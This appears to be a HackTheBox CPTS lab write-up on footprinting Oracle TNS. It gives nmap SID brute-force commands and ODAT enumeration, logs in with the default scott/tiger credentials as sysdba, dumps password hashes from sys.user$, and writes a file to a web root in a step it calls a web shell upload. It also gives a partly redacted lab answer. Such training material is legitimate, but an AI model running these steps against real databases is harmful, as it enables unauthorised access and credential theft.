### CPTS / HTB Penetration Tester Path <br>
### Footprinting - Oracle TNS <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Oracle TNS Footprinting



Oracle TNS — TCP 1521 default. Listener manages incoming client connections to Oracle DB instances. Configs in `$ORACLE_HOME/network/admin/`:
- `tnsnames.ora` — client-side; maps service names to network locations
- `listener.ora` — server-side; defines listener properties + SID list

Each DB instance has a unique `SID` (System Identifier). Client must know the SID to connect.

Default creds to try:
- Oracle 9: `change_on_install` (no default in 10g/11g)
- DBSNMP service: `dbsnmp:dbsnmp`

PL/SQL Exclusion List blacklists packages/types from execution via Oracle App Server.

Setup attack box (Oracle Instant Client + sqlplus + ODAT):

```diff
+ $ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+ $ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+ $ sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+ $ sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+ $ git clone https://github.com/quentinhardy/odat.git
```

Update `LD_LIBRARY_PATH` and `PATH` in `~/.bashrc` to include `/opt/oracle/instantclient_21_4`.

Nmap version scan:

```diff
+ $ sudo nmap -p1521 -sV 10.129.204.235 --open
```

Nmap SID brute-force:

```diff
+ $ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

[ODAT](https://github.com/quentinhardy/odat) — runs all enum + exploit modules:

```diff
+ $ ./odat.py all -s 10.129.204.235
```

Default cred `scott:tiger` is widely seeded.

Login with sqlplus:

```diff
+ $ sqlplus scott/tiger@10.129.204.235/XE
```

If you hit a libsqlplus.so error:

```diff
+ $ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Key SQL queries inside sqlplus:

```diff
+ SQL> select table_name from all_tables;
+ SQL> select * from user_role_privs;
```

Login as sysdba:

```diff
+ $ sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Pull password hashes from `sys.user$`:

```diff
+ SQL> select name, password from sys.user$;
```

Upload web shell via UTL_FILE / ODAT:

```diff
+ $ ./odat.py utlfile -s <target> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Check upload via web:

```diff
+ $ curl -X GET http://<target>/testing.txt
```

<br>

---

<br>

### Oracle TNS Exercise

IP: 10.129.14.222

---

### Question 1:
Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```diff
+ $ sudo nmap -p 1521 -sV --open 10.129.14.222
```

	1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

```diff
+ $ sudo nmap -p 1521 -sV --open --script=oracle-sid-brute 10.129.14.222
```

	|_  XE

#### Login as scott/tiger to XE:

```diff
+ $ sqlplus scott/tiger@10.129.14.222/XE
+ SQL> select * from user_role_privs;
```

#### scott has no admin role. Login as sysdba instead:

```diff
+ $ sqlplus scott/tiger@10.129.14.222/XE as sysdba
+ SQL> select name, password from sys.user$;
```

	DBSNMP                         E066D214D5421CCC

&#x1F6A9; found **E066D2--edit--14D5421CCC**.
